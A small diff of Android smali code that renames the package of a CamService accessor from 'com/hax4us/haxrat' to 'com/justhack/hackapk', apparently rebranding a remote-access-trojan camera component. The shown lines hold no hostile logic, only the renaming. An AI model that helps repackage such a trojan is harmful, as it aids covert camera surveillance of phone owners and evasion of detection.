@@ -39,14 +39,14 @@
     return-void
 .end method
 
-.method static access$0(Lcom/hax4us/haxrat/CamService$100000000;)Lcom/justhack/hackapk/CamService;
+.method static access$0(Lcom/justhack/hackapk/CamService$100000000;)Lcom/justhack/hackapk/CamService;
     .locals 4
 
     move-object v0, p0
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
+    iget-object v3, v3, Lcom/justhack/hackapk/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
 
     move-object v0, v3
 
